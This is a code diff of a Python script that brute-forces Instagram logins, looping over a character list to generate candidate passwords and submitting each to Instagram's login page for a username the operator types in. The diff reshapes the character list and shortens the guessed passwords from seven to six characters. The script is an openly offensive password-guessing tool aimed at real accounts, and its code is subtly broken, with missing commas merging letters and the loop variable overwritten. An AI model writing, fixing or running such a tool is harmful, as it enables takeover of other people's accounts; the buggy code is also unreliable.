@@ -6,83 +6,8 @@ from six.moves import input
 import typer 
 from tabulate import tabulate
 
-letters = [
-    'q',
-    'w',
-    'e',
-    'r',
-    't',
-    'y',
-    'u',
-    'i',
-    'o',
-    'p',
-    'a',
-    's',
-    'd',
-    'f',
-    'g',
-    'h',
-    'j'
-    'k',
-    'l',
-    'z',
-    'x',
-    'c',
-    'v',
-    'b',
-    'n',
-    'm',
-    'Q',
-    'W',
-    'E',
-    'R',
-    'T',
-    'Y',
-    'U',
-    'I',
-    'O',
-    'P',
-    'A',
-    'S',
-    'D',
-    'F',
-    'G',
-    'H',
-    'J'
-    'K',
-    'L',
-    'Z',
-    'X',
-    'C',
-    'V',
-    'B',
-    'N',
-    'M',
-    '0',
-    '1',
-    '2',
-    '3',
-    '4',
-    '5',
-    '6',
-    '7',
-    '8',
-    '9',
-    '_',
-    '!',
-    '@',
-    '#',
-    '$',
-    '%',
-    '^',
-    '&',
-    '*',
-    '(',
-    ')',
-    '-',
-    '+',
-    '=',
+letters = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j''k','l','z','x','c','v','b','n','m','Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C',
+    'V','B','N','M','0','1','2','3','4','5','6','7','8','9','_','!','@','#','$','%','^','&','*','(',')','-','+','=',
 ]
 def New_Br(user, pwd):
         link = 'https://www.instagram.com/accounts/login/'
@@ -130,13 +55,12 @@ def New_Br(user, pwd):
 def w6_start(username):
     username = typer.prompt(typer.style("--[x]-- Enter a username",fg=typer.colors.GREEN))
     with requests.Session() as s:
-        for q in letters.letters:
-            for w in letters.letters:
-                for e in letters.letters:
-                    for r in letters.letters:
-                        for t in letters.letters:
-                            for y in letters.letters:
-                                for o in letters.letters:
-                                    q=q+w+e+r+t+y+o
-                                    New_Br(username, q)
-                                    q = ""
+        for q in letters:
+            for w in letters:
+                for e in letters:
+                    for r in letters:
+                        for t in letters:
+                            for y in letters:
+                                q=q+w+e+r+t+y
+                                New_Br(username, q)
+                                q = ""
